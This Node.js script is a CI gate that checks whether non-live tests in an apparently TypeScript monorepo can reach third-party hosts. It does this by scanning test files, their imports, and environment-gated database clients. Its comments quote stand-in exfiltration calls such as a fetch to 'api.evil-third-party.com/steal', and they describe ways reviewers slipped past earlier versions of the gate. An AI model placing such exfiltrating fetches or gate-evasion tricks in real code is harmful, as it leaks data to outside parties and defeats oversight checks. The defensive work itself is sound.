#!/usr/bin/env node
/**
 * `check:hermetic-tests` — a test that is not a LIVE RAIL HARNESS must not reach a third party.
 *
 * ⛔⛔ **PORTED FROM `integra-agentic-commerce`, WHERE THE DEFECT THIS PREVENTS ACTUALLY SHIPPED.** That
 * repository committed a plain `.test.ts` whose second case read a chain tip and an account's UTXOs from
 * **Koios** — no env gate, no skip rule — so every `pnpm verify` in every environment made a live HTTP
 * call to a third-party indexer. ⚠️ **That measurement is COMMERCE'S, not this repository's, and it is
 * cited as history rather than restated as a local finding** — carrying a number across a port is how a
 * claim nobody measured ends up in a file nobody audits.
 *
 * ⭐ **WHAT IS TRUE HERE, measured 2026-09-14 at `52ca88f`:** the class is **clean today**. 154 test files,
 * 11 live rail harnesses, and the one test naming a `/tmp` path
 * (`packages/conformance/test/runner-verdicts.test.ts`) passes it as a **string argument to
 * `parseCliArgs`** — nothing is opened. ⇒ **This gate closes no live defect. It notices the next one**,
 * which is the whole of its value: `agent-commerce-plan#87` is the record that the class does not stay
 * clean on its own, and it did not — in the repository that already had the gate, one `import` outside
 * its subject set.
 *
 * ## ⛔ THE LIVE-HARNESS PREDICATE IS THIS REPOSITORY'S, NOT THE ONE THE GATE WAS BORN WITH
 *
 * Commerce excludes `*.live.test.ts`. **This repository has no such file** — 154 of 154 are plain
 * `.test.ts` — and a port that carried commerce's spelling would have swept all 11 rail harnesses into
 * the hermeticity subject set and reddened on the real endpoints they exist to reach. ⇒ The exclusion is
 * `integration*.test.ts`, and it is **imported from {@link ./live-harness-files.mjs}** rather than
 * restated, so it cannot drift from `live-rails.mjs`'s answer to the same question.
 *
 * ⚠️ That predicate has already been wrong once here: it was `integration.onchain.test.ts`, and both
 * Canton harnesses are `integration.canton.test.ts`, so both were omitted and a plan was built on the
 * short count. A prefix, never a spelling.
 *
 * ## ⭐ THE SUBJECT SET IS THE IMPORT GRAPH, NOT THE TEST FILE — `#87`'s widening, carried
 *
 * A host NAMED in a test and a host CALLED by one look identical to a grep, and a client that takes its
 * address from `process.env` writes no host into the file at all. So this gate reads **every non-live
 * test AND every module such a test imports**, and accounts for each third-party import as `inert`,
 * `addressed-in-source`, or `endpoint-from-environment`. ⛔ A port without this widening is the
 * empty-subject-set defect re-imported: commerce's gate read the importer and never the import, and the
 * Koios host its own head note is about sat one `import` outside its reach.
 *
 * ⛔ **Closed in both directions**, like its sibling: an undeclared host or import fails, and a
 * declaration that matches nothing in the tree fails too, because an exception that has stopped applying
 * is one nobody notices has gone stale.
 *
 * ⚠️ `*.example`, `*.test`, `*.invalid` and `example.com/org/net` are RESERVED for documentation and
 * testing (RFC 2606 / RFC 6761) and resolve nowhere, so they need no exception. Loopback needs none
 * either: a test that binds its own socket and talks to it is hermetic.
 *
 * USAGE
 *   node scripts/check-hermetic-tests.mjs
 *   INTEGRA_GATE_ROOT=<dir> node scripts/check-hermetic-tests.mjs   # a fixture (the drive uses this)
 */
import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { isLiveHarnessFile } from "./live-harness-files.mjs";

// ⛔ Normalised to a trailing separator. `new URL("..", import.meta.url).pathname` ends in one and a
// directory handed in by a drive does not, so a gate that builds paths by concatenation reads
// `/tmp/xyzpackages` and dies on a path that never existed. Normalising here makes a derived root and
// a supplied one interchangeable for every gate, whether it concatenates or joins.
const root_RAW =
  process.env["INTEGRA_GATE_ROOT"] ?? new URL("..", import.meta.url).pathname;
const root = root_RAW.endsWith("/") ? root_RAW : `${root_RAW}/`;

/**
 * Every non-loopback, non-reserved host a NON-LIVE test names, and why it is a value rather than a call.
 *
 * ⛔ Adding an entry here is a claim that the host is never fetched. Read the occurrence before making it.
 */
/**
 * Every non-loopback, non-reserved host a NON-LIVE test names, and why it is a value rather than a call.
 *
 * ⛔ Adding an entry is a claim that the host is never fetched. Read the occurrence before making it.
 *
 * ⛔ Held in the TREE, not here, for `check:capability-reachability`'s reason: a table baked into a gate
 * makes the gate undrivable — it can only ever run against the one tree whose hosts it already lists.
 */
const DECLARATIONS_PATH = join(
  root,
  "scripts",
  "hermetic-tests.declarations.json",
);
if (!existsSync(DECLARATIONS_PATH)) {
  console.error(
    `\nRefusing to verify: check:hermetic-tests — no declarations file at ` +
      `${DECLARATIONS_PATH.slice(root.length)}.\n\n` +
      "   This gate's exception table lives in the tree. Without it the gate would refuse every host any\n" +
      "   fixture names, which is not the property it checks.\n",
  );
  process.exit(1);
}
const declarations = JSON.parse(readFileSync(DECLARATIONS_PATH, "utf8"));
const NAMED_NOT_CALLED = declarations.namedNotCalled;

const die = (message) => {
  console.error(`\nRefusing to verify: check:hermetic-tests — ${message}\n`);
  process.exit(1);
};

/** Hosts that resolve nowhere by standard, so a test naming one cannot reach anything. */
const RESERVED =
  /(^(localhost|0\.0\.0\.0)$)|(^127\.)|(^\[?::1\]?$)|(\.(example|test|invalid|localhost)$)|((^|\.)example\.(com|org|net)$)/;

/**
 * ⛔⛔ **THE SUBJECT SET IS THREE THINGS BECAUSE IT WAS ONE, AND THE HOST THIS GATE WAS WRITTEN ABOUT
 * WAS SITTING IN THE PART IT COULD NOT SEE.**
 *
 * Until 2026-09-10 the enumeration was `endsWith(".test.ts")` and nothing else. Measured at that commit:
 * it read **227** files, while **236** `.test.ts` and **14** `.test.tsx` were on disk, and **23**
 * non-test modules lived under the packages' test roots. `grep -c '\.test\.tsx'` on this file returned
 * **0**; the positive control, `grep -c '\.test\.ts'`, returned **10** — so the zero was a real absence
 * and not a broken pattern.
 *
 * ⇒ And it was not theoretical. `seller-settlement/test/cardano-tx-builder.ts` holds
 * `https://preprod.koios.rest/api/v1` and four `fetch()` calls over it, and
 * `cardano-metadata.test.ts` — a plain `.test.ts` this gate DID read — imports it. **The gate read the
 * importer and not the import**, which is to say the Koios host in its own head note was one `import`
 * outside its subject set the entire time.
 *
 * So the set is now:
 *
 * 1. every non-live `.test.ts` **and `.test.tsx`** — a React suite reaches a network exactly as an
 *    `.ts` one does, and the extension it is written in is not a property of anything;
 * 2. every non-test module a test REACHES by relative import, transitively — a helper cannot be trusted
 *    because its importer was read;
 * 3. every non-test `.ts`/`.tsx` sitting under a package's test root, imported or not — because
 *    `seller-console/test/sweep-once.child.ts` and its two siblings are reached by
 *    `child_process.spawn` rather than by `import`, and an import walk alone cannot see a module that is
 *    executed by path.
 *
 * ⚠️ **`src/` is deliberately NOT in it.** Production source is `check:no-callback`'s subject and it
 * polices the same hosts for callability; pulling it in here would replace one gate's finding with
 * another's and say nothing new. What this gate owns is the TEST tree.
 */
const TEST_FILE = /\.test\.(?:ts|tsx)$/;
// ⛔ NOT commerce's `*.live.test.ts` — this repository has none. See the head note.
const LIVE_TEST_FILE = { test: (name) => isLiveHarnessFile(name) };
const TEST_ROOT = /(?:^|\/)(?:test|tests|__tests__)\//;
const SRC = /(?:^|\/)src\//;
const MODULE_FILE = /\.(?:ts|tsx|mts|cts)$/;

const files = [];
const liveFiles = [];
const supportOnDisk = [];
const walk = (dir) => {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const path = `${dir}/${entry.name}`;
    if (entry.isDirectory()) {
      if (entry.name === "node_modules" || entry.name === "dist") continue;
      walk(path);
      continue;
    }
    // ⭐ The subject set is every test that is NOT a live proof. A `.live.test.ts` is env-gated by
    // construction and reaching its network is the whole of what it does.
    if (TEST_FILE.test(entry.name)) {
      (LIVE_TEST_FILE.test(entry.name) ? liveFiles : files).push(path);
      continue;
    }
    const relative = path.slice(root.length);
    // ⚠️ Matched against the path RELATIVE to the root: a drive's scratch directory is free to have
    // `test` somewhere in its own absolute path, and matching that would sweep the whole tree in.
    if (MODULE_FILE.test(entry.name) && TEST_ROOT.test(relative))
      supportOnDisk.push(path);
  }
};
walk(`${root}packages`);

// The defect this repository has produced most often: a gate whose subject set silently empties and then
// reports success over nothing. It cannot here.
if (files.length === 0) {
  console.error(
    "\ncheck:hermetic-tests — NO non-live test files were found, which means this enumeration is wrong\n" +
      "rather than that the tree is clean.\n",
  );
  process.exit(1);
}

const sources = new Map();
const sourceOf = (file) => {
  if (!sources.has(file)) sources.set(file, readFileSync(file, "utf8"));
  return sources.get(file);
};

/**
 * Every module specifier a file names, in all five forms.
 *
 * ⛔ **THREE OF THE FIVE WERE ADDED AFTER SOMETHING GOT PAST.** An adversarial reviewer walked an
 * unclassified client through twice: `import "redis";` — a side-effect import, no `from` — and
 * `export { createClient } from "redis";`, which is an import wearing an export's clothes. Both bring the
 * module into the process exactly as a named import does. `import()` and `require()` are here for the
 * same reason, and `cardano-metadata.test.ts` reaches its Koios-carrying helper through the first of
 * them.
 */
const specifiersOf = (source) => {
  const specifiers = new Set();
  for (const match of source.matchAll(
    /(?:^|\n)\s*import[^;]*?from\s*["']([^"']+)["']|(?:^|\n)\s*import\s+["']([^"']+)["']|(?:^|\n)\s*export[^;]*?from\s*["']([^"']+)["']|\bimport\(\s*["']([^"']+)["']\s*\)|\brequire\(\s*["']([^"']+)["']\s*\)/g,
  ))
    specifiers.add(match[1] ?? match[2] ?? match[3] ?? match[4] ?? match[5]);
  return specifiers;
};

/**
 * A relative specifier, resolved to the file on disk that actually answers it.
 *
 * ⚠️ TypeScript's NodeNext resolution means the SOURCE says `./cardano-tx-builder.js` and the file is
 * `.ts`. A walk that took the specifier literally would resolve nothing, find no helpers, and go quiet —
 * which is the same silence this gate is being fixed for. Failing to resolve is therefore a FINDING
 * below, not a `continue`.
 */
const resolveRelative = (from, specifier) => {
  const base = resolve(dirname(from), specifier);
  const emitted = /\.(?:js|jsx|mjs|cjs)$/.exec(base);
  const candidates = [];
  if (emitted !== null) {
    const stem = base.slice(0, -emitted[0].length);
    candidates.push(`${stem}.ts`, `${stem}.tsx`, `${stem}.mts`, `${stem}.cts`);
  }
  candidates.push(
    base,
    `${base}.ts`,
    `${base}.tsx`,
    `${base}.mts`,
    `${base}.cts`,
    `${base}.json`,
    `${base}/index.ts`,
    `${base}/index.tsx`,
  );
  for (const candidate of candidates)
    if (existsSync(candidate) && statSync(candidate).isFile()) return candidate;
  return null;
};

const unresolved = new Set();
/** `dist/` is `src/` after a build, and `src/` is out of scope above for `check:no-callback`'s reason. */
const BUILT = /(?:^|\/)dist\//;

/** Every non-test, non-`src/` module this file reaches by relative import, transitively. */
const supportReachedBy = (file, record) => {
  const reached = new Set();
  const seen = new Set([file]);
  const queue = [file];
  while (queue.length > 0) {
    const current = queue.pop();
    for (const specifier of specifiersOf(sourceOf(current))) {
      if (!specifier.startsWith(".")) continue;
      if (BUILT.test(specifier)) continue;
      const resolved = resolveRelative(current, specifier);
      if (resolved === null) {
        if (record)
          unresolved.add(`${current.slice(root.length)} → ${specifier}`);
        continue;
      }
      if (seen.has(resolved)) continue;
      seen.add(resolved);
      if (SRC.test(resolved.slice(root.length))) continue;
      if (TEST_FILE.test(resolved)) continue;
      reached.add(resolved);
      // A `.json` vector is data: it carries hosts to scan and no imports to follow.
      if (!resolved.endsWith(".json")) queue.push(resolved);
    }
  }
  return reached;
};

const reached = new Map();
const reachedByANonLiveTest = new Set();
for (const file of files) {
  const modules = supportReachedBy(file, true);
  reached.set(file, modules);
  for (const module of modules) reachedByANonLiveTest.add(module);
}

/**
 * ⭐ **What only a LIVE PROOF can reach is live-proof code, and it is exempt for the same reason the
 * `.live.test.ts` itself is** — env-gated by construction, and reaching a network is the whole of what it
 * does. This is that exemption carried one hop out, and it is what lets the network half of a rail live
 * in a module instead of in a declarations entry: `cardano-tx-builder.ts` reads the chain tip from Koios,
 * only `cardano-metadata.live.test.ts` imports it, and the pure codec its offline sibling needs is a
 * separate file.
 *
 * ⛔ It is not a hiding place. The exemption is a DIFFERENCE — reached by a live proof and by nothing
 * else. The moment any non-live test imports such a module, directly or through a helper, it is back in
 * the subject set and its hosts must answer for themselves.
 */
const reachedByALiveProof = new Set();
for (const file of liveFiles)
  for (const module of supportReachedBy(file, false))
    reachedByALiveProof.add(module);

const support = new Set(
  [...supportOnDisk, ...reachedByANonLiveTest].filter(
    (module) =>
      reachedByANonLiveTest.has(module) || !reachedByALiveProof.has(module),
  ),
);

/** Everything the host scan reads: the tests, and the modules they can execute. */
const scanned = [...files, ...support];

/**
 * Every `http(s)://` occurrence's AUTHORITY — userinfo, host and port, up to the first `/`, `?` or `#`.
 *
 * ⛔ It captures the authority rather than the host because the host cannot be read without first
 * accounting for what may precede it. See {@link hostOf}.
 */
const URL_AUTHORITY = /https?:\/\/([^/?#\s"'`]*)/g;

/**
 * The host an occurrence actually names, or `null` when it names none.
 *
 * ⛔⛔ **THE PATTERN THIS REPLACES — `https?:\/\/([A-Za-z0-9._-]+)` — WAS BLIND IN TWO DIRECTIONS AND
 * NOISY IN A THIRD.** All three were driven against this gate at `a59607a`, in this repository, with a
 * positive control that fires (`https://api.evil-third-party.com/x` → refused, naming that host):
 *
 * **1 · A CREDENTIALED URL YIELDED THE USERNAME.** `:` and `@` are outside that character class, so
 * `fetch("https://user@api.evil-third-party.com/steal")` was reported as naming the host `user`. ⚠️ It
 * still went RED, so nothing passed silently — **what was poisoned is the DECLARATION path.** A reader
 * meeting `user` reasonably records it as a placeholder in a credential fixture, and that one entry then
 * exempts every credentialed URL to every third party, because the scan never sees anything else. Driven:
 * with `"user"` declared, a body fetching `https://user@api.evil-third-party.com/exfiltrate` **and**
 * `https://user@another-real-host.net/also` exits **0** and prints
 * `1 third-party host(s), each enumerated as named-not-called`.
 *
 * **2 · ⛔⛔ AN IPv6 LITERAL WAS INVISIBLE ENTIRELY, AND THIS ONE FAILS OPEN WITH NO DECLARATION
 * NEEDED.** `[` is outside the class, so the pattern matched nothing at all. Driven, and the contrast is
 * the whole finding — the same destination, twice:
 *
 * ```
 * fetch("https://one.one.one.one/dns-query")              -> refused, names one.one.one.one
 * fetch("https://[2606:4700:4700::1111]/dns-query")       -> EXIT 0, nothing reported
 * ```
 *
 * A test reaching a third party over an address literal passed this gate without anyone declaring
 * anything. ⇒ Brackets are read, and `RESERVED` already covers `[::1]`, so loopback stays hermetic.
 *
 * **3 · AN INTERPOLATED AUTHORITY YIELDED A FRAGMENT OF THE USERINFO.** `https://u:p@${HOST}/x` names no
 * host, and the old trailing-`$` check could not see it because the `$` is not at the end of the match —
 * it reported `u`. ⚠️ A blanket skip on `${` would be wrong the other way: `https://real.example.com${path}`
 * DOES name its host. So the authority is truncated at the first `${` and whatever is literally written
 * before it still counts.
 *
 * ⚠️ **And one thing that is NOT a defect in the old pattern, recorded so nobody hunts for it:** the host
 * CHARSET check below. `[A-Za-z0-9._-]+` got that for free by construction; capturing the authority loses
 * it, and without it a bare `https://…` in a comment reads as a third-party host named `…`. It is a
 * companion to this change, not a fault in what came before.
 *
 * ⚠️ `integra-agentic-commerce` carries the original line — agent-commerce-plan#147.
 *
 * @param {string} authority the captured authority.
 * @returns {string | null} the lowercased host, or null if the occurrence names none.
 */
const hostOf = (authority) => {
  // Only what is LITERALLY written can be judged.
  const literal = authority.split("${")[0];
  const at = literal.lastIndexOf("@");
  const hostPort = at === -1 ? literal : literal.slice(at + 1);
  if (hostPort === "") return null;
  if (hostPort.startsWith("[")) {
    const close = hostPort.indexOf("]");
    return close === -1 ? null : hostPort.slice(0, close + 1).toLowerCase();
  }
  const host = /^[A-Za-z0-9._-]+/.exec(hostPort.split(":")[0]);
  return host === null ? null : host[0].toLowerCase();
};

const found = new Map();
for (const file of scanned) {
  const source = sourceOf(file);
  for (const match of source.matchAll(URL_AUTHORITY)) {
    // ⛔⛔ LOWERCASED BY `hostOf`, AND THE PORT TO `integra-agentic-terms` IS WHAT FOUND THIS. Host names
    // are case-insensitive (RFC 4343), and `RESERVED` carries no `i` flag — so
    // `https://Seller.Example/Terms/AbC.md`, in `discovery/test/discovery.test.ts`, was reported as an
    // undeclared third-party host despite `.example` being RFC 2606 reserved. Declaring it would have
    // written a permanent exception for a host that does not exist, to work around a case-sensitive
    // regex. ⚠️ The same line is in `integra-agentic-commerce`'s copy and is latent there only because
    // nothing in that tree spells a reserved host in mixed case — agent-commerce-plan#147.
    const host = hostOf(match[1]);
    if (host === null) continue;
    if (RESERVED.test(host)) continue;
    if (!found.has(host)) found.set(host, new Set());
    found.get(host).add(file.slice(root.length));
  }
}

/**
 * ⛔⛔ **X-3 — A HOST SCAN CANNOT SEE A CLIENT THAT TAKES ITS ADDRESS FROM THE ENVIRONMENT.**
 *
 * `seller-console/test/ports.test.ts` opens a real `pg.Pool` from a plain `.test.ts`. It is honest — the
 * suite is `describe.skip`ped unless `POSTGRES_TEST_URL` is set — but this gate could not tell: the
 * connection string never appears in the file, so the scan above has nothing to find (2026-08-24
 * floor-campaign residue, X-3 / R-5).
 *
 * ⇒ A second subject set, and it is the IMPORTS rather than a roster of clients: every third-party
 * specifier a non-live test names is classified in the declarations file as `inert`,
 * `addressed-in-source` or `endpoint-from-environment`, and an unclassified one fails. That is what makes
 * a NEW client of the third kind a build failure the day it arrives, rather than a blind spot nobody has
 * noticed yet — which is the whole difference between this and a list of database drivers.
 *
 * ⚠️ Only `endpoint-from-environment` forces a gate. `addressed-in-source` is covered by the host scan
 * above, and loopback is hermetic by this file's own head note.
 */
const IMPORTS = declarations.imports ?? {};
const KINDS = ["inert", "addressed-in-source", "endpoint-from-environment"];

/**
 * Does this file gate itself on the environment? Read as a QUESTION about the source rather than a match
 * on one spelling: what makes a suite honest is that whether it runs depends on a variable the environment
 * supplies, and there is more than one correct way to write that.
 */
/**
 * The conditional-suite forms, with the CONDITION captured — because the condition is the whole question.
 *
 * ⛔⛔ **AN UNRELATED CONDITION IS NOT AN ENVIRONMENT GATE.** The first version tested only that some
 * conditional form appeared somewhere in the file, so an adversarial reviewer passed a suite opening a real
 * `pg.Pool` at module scope against `postgres://prod/db` by adding
 * `describe.skipIf(process.platform === "win32")` — a condition about the operating system, satisfied by
 * a sibling's `process.env` read one directory over. What makes a suite honest is that whether it runs
 * depends on the variable it needs, and that is what is checked.
 */
const CONDITIONAL_SUITE =
  /\b(?:describe|it|test)\.(?:skipIf|runIf)\(([^;]*?)\)\s*[(,]|([^\n;]*?)\?\s*describe\s*:\s*describe\.skip|([^\n;]*?)\?\s*describe\.skip\s*:\s*describe/g;

/** Every identifier this file — or a sibling — binds from `process.env`. The names a gate may turn on. */
const envBound = (sources) => {
  const names = new Set();
  for (const source of sources)
    for (const match of source.matchAll(
      /(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*(?::[^=]+)?=\s*process\.env\[/g,
    ))
      names.add(match[1]);
  return names;
};

const envGated = (source, names) => {
  if (names.size === 0) return false;
  for (const match of source.matchAll(CONDITIONAL_SUITE)) {
    const condition = match[1] ?? match[2] ?? match[3] ?? "";
    // ⭐ A direct `process.env[…]` in the condition counts too — a suite that reads it inline is gated on
    // it just as honestly as one that reads it through a named constant.
    if (/process\.env\[/.test(condition)) return true;
    for (const name of names)
      if (new RegExp(`\\b${name}\\b`).test(condition)) return true;
  }
  return false;
};

/**
 * Every third-party specifier this file names.
 *
 * ⚠️ Relative imports are this repository's own source — and they are no longer dropped on the floor:
 * `supportReachedBy` above follows them, which is what put the Koios helper inside the subject set.
 * Workspace `@integraledger/` packages are covered by every gate that runs over them. What is CLASSIFIED
 * here is what comes from outside.
 */
const importsOf = (source) =>
  new Set(
    [...specifiersOf(source)].filter(
      (specifier) =>
        !specifier.startsWith(".") && !specifier.startsWith("@integraledger/"),
    ),
  );

const problems = [];

/**
 * The environment-bound identifiers visible to a test — its own, plus its directory's.
 *
 * ⚠️ The variable may be read ONE DIRECTORY OVER, and that is the better arrangement rather than a
 * loophole: `seller-store-postgres/test/fixtures.ts` reads `POSTGRES_TEST_URL` once and every suite beside
 * it imports the answer, "because two copies of a skip rule can drift". What the FILE must carry is a
 * condition that turns on one of these NAMES.
 */
const envNames = new Map();
const envNamesNear = (file) => {
  const dir = file.slice(0, file.lastIndexOf("/"));
  if (!envNames.has(dir))
    envNames.set(
      dir,
      envBound(
        readdirSync(dir, { withFileTypes: true })
          .filter((entry) => entry.isFile() && MODULE_FILE.test(entry.name))
          .map((entry) => readFileSync(`${dir}/${entry.name}`, "utf8")),
      ),
    );
  return envNames.get(dir);
};

const importsSeen = new Set();
/** What each file classifies to, so a test can be judged on what its HELPERS bring in as well. */
const fromEnvironmentIn = new Map();
// ⭐ Over `scanned`, not over `files`: a helper's `pg` is the test's `pg`. Classifying only the importer
// is the same mistake as host-scanning only the importer.
for (const file of scanned) {
  if (file.endsWith(".json")) continue;
  const unclassified = [];
  const fromEnvironment = [];
  for (const specifier of importsOf(sourceOf(file))) {
    importsSeen.add(specifier);
    const entry = IMPORTS[specifier];
    if (entry === undefined || !KINDS.includes(entry.kind)) {
      unclassified.push(specifier);
      continue;
    }
    if (entry.kind === "endpoint-from-environment")
      fromEnvironment.push(specifier);
  }
  fromEnvironmentIn.set(file, fromEnvironment);
  if (unclassified.length > 0)
    problems.push(
      `  ${file.slice(root.length)}\n` +
        `      imports ${unclassified.map((s) => `\`${s}\``).join(", ")}, which nothing classifies.\n` +
        `      Say in scripts/hermetic-tests.declarations.json which of ${KINDS.join(" / ")} it is, and\n` +
        "      why. A client whose address comes from the environment writes no host into the file, so the\n" +
        "      host scan above cannot see it — which is exactly how a real `pg.Pool` sat in a plain\n" +
        "      `.test.ts` unnoticed.",
    );
}

// ⚠️ The GATE is a property of the test file, never of the helper: a fixture module has no suite to skip,
// so demanding a condition of it would be demanding something it cannot express. What is judged is the
// test — over everything it can pull in, its helpers' clients included, which is exactly the reach
// `seller-store-postgres/test/fixtures.ts` has when it opens the pool the suites beside it use.
for (const file of files) {
  const fromEnvironment = [
    ...new Set(
      [file, ...(reached.get(file) ?? [])].flatMap(
        (module) => fromEnvironmentIn.get(module) ?? [],
      ),
    ),
  ];
  // ⚠️ The variable may be read ONE DIRECTORY OVER, and that is the better arrangement rather than a
  // loophole: `seller-store-postgres/test/fixtures.ts` reads `POSTGRES_TEST_URL` once and every suite
  // beside it imports the answer, "because two copies of a skip rule can drift". What the file itself must
  // carry is the CONDITION — a suite that is unconditionally skipped is not gated, it is off.
  if (
    fromEnvironment.length > 0 &&
    !envGated(sourceOf(file), envNamesNear(file))
  )
    problems.push(
      `  ${file.slice(root.length)}\n` +
        `      imports ${fromEnvironment.map((s) => `\`${s}\``).join(", ")}, whose address comes from the\n` +
        "      environment, and is neither a `.live.test.ts` nor gated on the variable it needs. A\n" +
        "      `pnpm verify` that dials a database fails red for a reason that is not in the tree.",
    );
}

// ⛔ An import this walk could not resolve is a module it did not read, and a module it did not read is
// precisely the blind spot being closed. It is a finding, not a `continue`.
for (const edge of unresolved)
  problems.push(
    `  ${edge}\n      is a relative import this gate could not resolve to a file, so the module it names\n` +
      "      was never scanned. A subject set with a hole in it reports green over the hole.",
  );

// ⛔ The vacuity guard, and it is stated as a RELATION rather than as "the table is non-empty": a tree
// whose tests import nothing third-party is a tree with nothing to classify, and demanding a table for it
// would be this gate refusing a clean fixture. What is refused is imports with no classifications at all.
if (importsSeen.size > 0 && Object.keys(IMPORTS).length === 0)
  die(
    `${String(importsSeen.size)} third-party import(s) appear in non-live tests and the declarations file\n` +
      "classifies none of them. That is X-3's entire subject set; an empty table over a non-empty tree\n" +
      "asserts nothing while printing success.",
  );

// Closed in the other direction, like the host table: a classification nothing imports is an entry the
// next reader takes as evidence that the capability is still being watched for.
for (const specifier of Object.keys(IMPORTS))
  if (!importsSeen.has(specifier))
    problems.push(
      `  ${specifier}\n      is classified in the declarations and no non-live test imports it. Delete\n` +
        "      the entry: a classification that classifies nothing reads as one that does.",
    );

for (const [host, where] of found)
  if (NAMED_NOT_CALLED[host] === undefined)
    problems.push(
      `  ${host}\n      named by: ${[...where].join(", ")}\n` +
        "      A non-live test may not reach a third party. If this host is FETCHED, move the case into a\n" +
        "      `.live.test.ts` behind the same env gate its siblings use. If it is only a value in a fixture,\n" +
        "      add it to NAMED_NOT_CALLED with the reason — after reading the occurrence.",
    );

// Closed in the other direction too: an exception naming a host that is gone is one nobody will notice has
// stopped applying, and the next reader takes it as evidence that the host is still fine to name.
for (const host of Object.keys(NAMED_NOT_CALLED))
  if (!found.has(host))
    problems.push(
      `  ${host}\n      is listed in NAMED_NOT_CALLED and appears in no non-live test. Delete the entry:\n` +
        "      an exception that excludes nothing reads as one that does.",
    );

if (problems.length > 0) {
  console.error(
    "\nRefusing to verify: check:hermetic-tests\n\n" +
      `${problems.join("\n\n")}\n`,
  );
  process.exit(1);
}

// ⭐ The subject set is PRINTED, in its parts, because the whole of this gate's 2026-09-10 defect was
// that nobody could see what it had enumerated: `227` read as the number of test files in the repository
// rather than as the number of `.test.ts` files, and the 14 `.test.tsx` and 23 helper modules it was not
// reading left no trace in its own success line.
const tsx = files.filter((file) => file.endsWith(".tsx")).length;
console.log(
  `check:hermetic-tests — scanned ${String(scanned.length)} file(s): ` +
    `${String(files.length)} non-live test file(s) (${String(files.length - tsx)} .test.ts + ` +
    `${String(tsx)} .test.tsx) and ${String(support.size)} test-support module(s) they import or are ` +
    `spawned beside; ${String(found.size)} third-party host(s), each enumerated as named-not-called; ` +
    `${String(importsSeen.size)} third-party import(s), each classified, and every one whose endpoint ` +
    "comes from the environment behind a gate. OK",
);
